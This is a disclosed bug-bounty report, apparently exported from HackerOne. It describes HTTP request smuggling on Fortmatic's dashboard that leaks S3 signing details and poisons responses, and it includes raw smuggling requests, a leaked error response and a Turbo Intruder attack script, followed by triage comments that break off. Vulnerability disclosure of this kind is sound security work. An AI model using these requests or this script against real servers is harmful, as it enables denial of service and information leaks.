{"id":753939,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NTM5Mzk=","url":"https://hackerone.com/reports/753939","title":"HTTP SMUGGLING EXPOSED HMAC/DOS ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-12-08T11:22:11.773Z","submitted_at":"2019-12-08T11:22:11.773Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pwny_sec","url":"/pwny_sec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35713,"url":"https://hackerone.com/fortmatic_inc","handle":"fortmatic_inc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/EbrjQHcHizvCKJMmYojb7krJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/EbrjQHcHizvCKJMmYojb7krJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Fortmatic Inc.","twitter_handle":"fortmatic","website":"https://fortmatic.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-03-24T01:42:24.015Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-03-23T19:17:26.533Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"HTTP SMUGGLING EXPOSED HMAC / DOS\n\nUsing the transfer-encoding header and following it with a zero. The back end leaked the hmac the back end reflected back the hmac key encryption type, and a lot of details. Further testing had it reflect more headers. [http-smuggling-dashboard-fortmatic.png] we will notice i was able to cause the next valid request to error out returning valuable details. Next picture will show the response being reflected back this is important, i will be devoting time on exploiting this further. \n\nProof of Concept\n\n`[space]Transfer-Encoding: chunked`\n\n```\nGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n Transfer-Encoding: chunked\n\n0\n\n\n```\n\nResponse\n\n```\nHTTP/1.1 403 Forbidden\nContent-Type: application/xml\nTransfer-Encoding: chunked\nConnection: close\nDate: Sun, 08 Dec 2019 11:00:51 GMT\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src 'self';style-src 'self' 'unsafe-inline'; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src 'self' https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src 'self' https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src 'self'  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri 'self';\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: Error from cloudfront\nVia: 1.1 e2deefdf2f2c76b24ee4785b69116006.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL56-C3\nX-Amz-Cf-Id: znmHV1cu6phenKt25Mwr0WtHOgrpgrR4FvReDNGyaA2t__4ZCGRdmA==\n\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003cError\u003e\u003cCode\u003eSignatureDoesNotMatch\u003c/Code\u003e\u003cMessage\u003eThe request signature we calculated does not match the signature you provided. Check your key and signing method.\u003c/Message\u003e\u003cAWSAccessKeyId\u003eAKIAIJKUV7PUHL53M2YQ\u003c/AWSAccessKeyId\u003e\u003cStringToSign\u003eAWS4-HMAC-SHA256\n20191208T110051Z\n20191208/us-west-2/s3/aws4_request\n7f35f27b1337db0e03780f8a4e47f011a5ae6fa11d0d62f36a953cf9b2021fc1\u003c/StringToSign\u003e\u003cSignatureProvided\u003ea39151b144736e9967f33fcc5c4e6d5d6221975273efc1bda31661d92ade8658\u003c/SignatureProvided\u003e\u003cStringToSignBytes\u003e41 57 53 34 2d 48 4d 41 43 2d 53 48 41 32 35 36 0a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 32 30 31 39 31 32 30 38 2f 75 73 2d 77 65 73 74 2d 32 2f 73 33 2f 61 77 73 34 5f 72 65 71 75 65 73 74 0a 37 66 33 35 66 32 37 62 31 33 33 37 64 62 30 65 30 33 37 38 30 66 38 61 34 65 34 37 66 30 31 31 61 35 61 65 36 66 61 31 31 64 30 64 36 32 66 33 36 61 39 35 33 63 66 39 62 32 30 32 31 66 63 31\u003c/StringToSignBytes\u003e\u003cCanonicalRequest\u003eGET\n/index.html\n\ncontent-type:application/x-www-form-urlencoded Transfer-Encoding: chunked\nhost:dashboard.fortmatic.com.s3.amazonaws.com\nx-amz-content-sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nx-amz-date:20191208T110051Z\n\ncontent-type;host;x-amz-content-sha256;x-amz-date\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u003c/CanonicalRequest\u003e\u003cCanonicalRequestBytes\u003e47 45 54 0a 2f 69 6e 64 65 78 2e 68 74 6d 6c 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64 20 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0a 68 6f 73 74 3a 64 61 73 68 62 6f 61 72 64 2e 66 6f 72 74 6d 61 74 69 63 2e 63 6f 6d 2e 73 33 2e 61 6d 61 7a 6f 6e 61 77 73 2e 63 6f 6d 0a 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35 0a 78 2d 61 6d 7a 2d 64 61 74 65 3a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3b 68 6f 73 74 3b 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3b 78 2d 61 6d 7a 2d 64 61 74 65 0a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35\u003c/CanonicalRequestBytes\u003e\u003cRequestId\u003eD6ACD16A4B4F1851\u003c/RequestId\u003e\u003cHostId\u003eR+VilJrBSB5s4ILN8GAc98W5eIh6vZguZp+RPJBg/1QimzpFTvwgbtC/BYiNNmx6m8USBuzLndo=\u003c/HostId\u003e\u003c/Error\u003e\n```\n\nNow lets change it up and try to cause cache poisoning and move it to desync attack.  The headers don't change much but this will cause the next valid request to be served with the error page. Load the request into turbo intruder to make finding it easier. This will in affect server users with my error page causing DOS. Notice in http-smuggling-dashboard-fortmatic2.png that the 200 status code are reflected back when you load the page. this is because when the error page happens it reflects a valid response to me. \n\nTurbo:\n\n```\n# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time\nimport re\n\ndef queueRequests(target, wordlists):\n\n    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n    engine.start()\n\n    # This will prefix the victim's request. Edit it to achieve the desired effect.\n    prefix = '''GET / HTTP/1.1\nHost: x2.fortmatic.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''\n\n    chunk_size = hex(len(prefix)).lstrip(\"0x\")\n    attack = target.req.replace('0\\r\\n\\r\\n', chunk_size+'\\r\\n'+prefix+'\\r\\n0\\r\\n\\r\\n')\n    content_length = re.search('Content-Length: ([\\d]+)', attack).group(1)\n    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))\n    engine.queue(attack)\n\n    for i in range(1400):\n        engine.queue(target.req)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\nRequest\n\n```\nGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\n Transfer-Encoding: chunked\n\n72\nGET / HTTP/1.1\nHost: x2.fortmatic.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\n\n```\n\n\n\nImpact:\n\nThe miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more\n\nResources:\n\nhttps://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\nhttps://portswigger.net/web-security/request-smuggling\nhttps://portswigger.net/research/practical-web-cache-poisoning\n\n## Impact\n\nImpact:\n\nThe miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more","vulnerability_information_html":"\u003cp\u003eHTTP SMUGGLING EXPOSED HMAC / DOS\u003c/p\u003e\n\n\u003cp\u003eUsing the transfer-encoding header and following it with a zero. The back end leaked the hmac the back end reflected back the hmac key encryption type, and a lot of details. Further testing had it reflect more headers. [http-smuggling-dashboard-fortmatic.png] we will notice i was able to cause the next valid request to error out returning valuable details. Next picture will show the response being reflected back this is important, i will be devoting time on exploiting this further. \u003c/p\u003e\n\n\u003cp\u003eProof of Concept\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e[space]Transfer-Encoding: chunked\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n Transfer-Encoding: chunked\n\n0\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 403 Forbidden\nContent-Type: application/xml\nTransfer-Encoding: chunked\nConnection: close\nDate: Sun, 08 Dec 2019 11:00:51 GMT\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src \u0026#39;self\u0026#39;;style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src \u0026#39;self\u0026#39; https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src \u0026#39;self\u0026#39; https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src \u0026#39;self\u0026#39;  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri \u0026#39;self\u0026#39;;\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: Error from cloudfront\nVia: 1.1 e2deefdf2f2c76b24ee4785b69116006.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL56-C3\nX-Amz-Cf-Id: znmHV1cu6phenKt25Mwr0WtHOgrpgrR4FvReDNGyaA2t__4ZCGRdmA==\n\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n\u0026lt;Error\u0026gt;\u0026lt;Code\u0026gt;SignatureDoesNotMatch\u0026lt;/Code\u0026gt;\u0026lt;Message\u0026gt;The request signature we calculated does not match the signature you provided. Check your key and signing method.\u0026lt;/Message\u0026gt;\u0026lt;AWSAccessKeyId\u0026gt;AKIAIJKUV7PUHL53M2YQ\u0026lt;/AWSAccessKeyId\u0026gt;\u0026lt;StringToSign\u0026gt;AWS4-HMAC-SHA256\n20191208T110051Z\n20191208/us-west-2/s3/aws4_request\n7f35f27b1337db0e03780f8a4e47f011a5ae6fa11d0d62f36a953cf9b2021fc1\u0026lt;/StringToSign\u0026gt;\u0026lt;SignatureProvided\u0026gt;a39151b144736e9967f33fcc5c4e6d5d6221975273efc1bda31661d92ade8658\u0026lt;/SignatureProvided\u0026gt;\u0026lt;StringToSignBytes\u0026gt;41 57 53 34 2d 48 4d 41 43 2d 53 48 41 32 35 36 0a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 32 30 31 39 31 32 30 38 2f 75 73 2d 77 65 73 74 2d 32 2f 73 33 2f 61 77 73 34 5f 72 65 71 75 65 73 74 0a 37 66 33 35 66 32 37 62 31 33 33 37 64 62 30 65 30 33 37 38 30 66 38 61 34 65 34 37 66 30 31 31 61 35 61 65 36 66 61 31 31 64 30 64 36 32 66 33 36 61 39 35 33 63 66 39 62 32 30 32 31 66 63 31\u0026lt;/StringToSignBytes\u0026gt;\u0026lt;CanonicalRequest\u0026gt;GET\n/index.html\n\ncontent-type:application/x-www-form-urlencoded Transfer-Encoding: chunked\nhost:dashboard.fortmatic.com.s3.amazonaws.com\nx-amz-content-sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nx-amz-date:20191208T110051Z\n\ncontent-type;host;x-amz-content-sha256;x-amz-date\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026lt;/CanonicalRequest\u0026gt;\u0026lt;CanonicalRequestBytes\u0026gt;47 45 54 0a 2f 69 6e 64 65 78 2e 68 74 6d 6c 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64 20 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 75 6e 6b 65 64 0a 68 6f 73 74 3a 64 61 73 68 62 6f 61 72 64 2e 66 6f 72 74 6d 61 74 69 63 2e 63 6f 6d 2e 73 33 2e 61 6d 61 7a 6f 6e 61 77 73 2e 63 6f 6d 0a 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35 0a 78 2d 61 6d 7a 2d 64 61 74 65 3a 32 30 31 39 31 32 30 38 54 31 31 30 30 35 31 5a 0a 0a 63 6f 6e 74 65 6e 74 2d 74 79 70 65 3b 68 6f 73 74 3b 78 2d 61 6d 7a 2d 63 6f 6e 74 65 6e 74 2d 73 68 61 32 35 36 3b 78 2d 61 6d 7a 2d 64 61 74 65 0a 65 33 62 30 63 34 34 32 39 38 66 63 31 63 31 34 39 61 66 62 66 34 63 38 39 39 36 66 62 39 32 34 32 37 61 65 34 31 65 34 36 34 39 62 39 33 34 63 61 34 39 35 39 39 31 62 37 38 35 32 62 38 35 35\u0026lt;/CanonicalRequestBytes\u0026gt;\u0026lt;RequestId\u0026gt;D6ACD16A4B4F1851\u0026lt;/RequestId\u0026gt;\u0026lt;HostId\u0026gt;R+VilJrBSB5s4ILN8GAc98W5eIh6vZguZp+RPJBg/1QimzpFTvwgbtC/BYiNNmx6m8USBuzLndo=\u0026lt;/HostId\u0026gt;\u0026lt;/Error\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow lets change it up and try to cause cache poisoning and move it to desync attack.  The headers don\u0026#39;t change much but this will cause the next valid request to be served with the error page. Load the request into turbo intruder to make finding it easier. This will in affect server users with my error page causing DOS. Notice in http-smuggling-dashboard-fortmatic2.png that the 200 status code are reflected back when you load the page. this is because when the error page happens it reflects a valid response to me. \u003c/p\u003e\n\n\u003cp\u003eTurbo:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# if you edit this file, ensure you keep the line endings as CRLF or you\u0026#39;ll have a bad time\nimport re\n\ndef queueRequests(target, wordlists):\n\n    # to use Burp\u0026#39;s HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n    engine.start()\n\n    # This will prefix the victim\u0026#39;s request. Edit it to achieve the desired effect.\n    prefix = \u0026#39;\u0026#39;\u0026#39;GET / HTTP/1.1\nHost: x2.fortmatic.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\u0026#39;\u0026#39;\u0026#39;\n\n    chunk_size = hex(len(prefix)).lstrip(\u0026quot;0x\u0026quot;)\n    attack = target.req.replace(\u0026#39;0\\r\\n\\r\\n\u0026#39;, chunk_size+\u0026#39;\\r\\n\u0026#39;+prefix+\u0026#39;\\r\\n0\\r\\n\\r\\n\u0026#39;)\n    content_length = re.search(\u0026#39;Content-Length: ([\\d]+)\u0026#39;, attack).group(1)\n    attack = attack.replace(\u0026#39;Content-Length: \u0026#39;+content_length, \u0026#39;Content-length: \u0026#39;+str(int(content_length)+len(chunk_size)-3))\n    engine.queue(attack)\n\n    for i in range(1400):\n        engine.queue(target.req)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRequest\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\n Transfer-Encoding: chunked\n\n72\nGET / HTTP/1.1\nHost: x2.fortmatic.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eImpact:\u003c/p\u003e\n\n\u003cp\u003eThe miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more\u003c/p\u003e\n\n\u003cp\u003eResources:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fhttp-desync-attacks-request-smuggling-reborn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://portswigger.net/web-security/request-smuggling\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fweb-security%2Frequest-smuggling\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/web-security/request-smuggling\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://portswigger.net/research/practical-web-cache-poisoning\" href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fpractical-web-cache-poisoning\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://portswigger.net/research/practical-web-cache-poisoning\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eImpact:\u003c/p\u003e\n\n\u003cp\u003eThe miss configuration with the back end cause it to reflect back the error page when the next valid request comes through. This will lead to a DOS serve this error page when visitor view the website. I will work on exploiting this more\u003c/p\u003e\n","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-04-22T19:17:26.619Z","allow_singular_disclosure_after":-21641368.42847166,"singular_disclosure_allowed":true,"vote_count":71,"voters":["thaivu","checkm50","friyin","base_64","mik317","mygf","tulswani","0xd0m7","brodie_codie","realtess","and 61 more..."],"severity":{"rating":"medium","score":6.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6502480,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @pwny_sec,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T12:22:02.233Z","updated_at":"2019-12-09T12:22:02.233Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6503053,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @pwny_sec\n\nUnfortunately, this instance of HTTP request desync/smuggling doesn’t demonstrate a real-world impact. In order for a desync/smuggling attack to be valid, you need to prove an attack vector along with the (already provided) exploit. \n\nFor instance:\n- Being able to poison the socket, and redirect victims to an external host\n- Being able to poison the socket, and obtain a stored XSS\n- Being able to poison the socket, and exfiltrate the request’s headers via a crafted POST request to an external entity\n\nIn short, you need to prove impact, as redirecting someone from page A to page B or page 404 doesn’t really configure a security risk on itself.\n\nKind regards,\n@beagle \n  \n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eUnfortunately, this instance of HTTP request desync/smuggling doesn’t demonstrate a real-world impact. In order for a desync/smuggling attack to be valid, you need to prove an attack vector along with the (already provided) exploit. \u003c/p\u003e\n\n\u003cp\u003eFor instance:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eBeing able to poison the socket, and redirect victims to an external host\u003c/li\u003e\n\u003cli\u003eBeing able to poison the socket, and obtain a stored XSS\u003c/li\u003e\n\u003cli\u003eBeing able to poison the socket, and exfiltrate the request’s headers via a crafted POST request to an external entity\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIn short, you need to prove impact, as redirecting someone from page A to page B or page 404 doesn’t really configure a security risk on itself.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T13:31:04.066Z","updated_at":"2019-12-09T13:31:04.066Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6503185,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"the sockets poisoned ","markdown_message":"\u003cp\u003ethe sockets poisoned \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T13:42:00.465Z","updated_at":"2019-12-09T13:42:00.465Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6503197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"IT reflects back teh http error when you load the page. i provided the tools to demonstrate this ","markdown_message":"\u003cp\u003eIT reflects back teh http error when you load the page. i provided the tools to demonstrate this 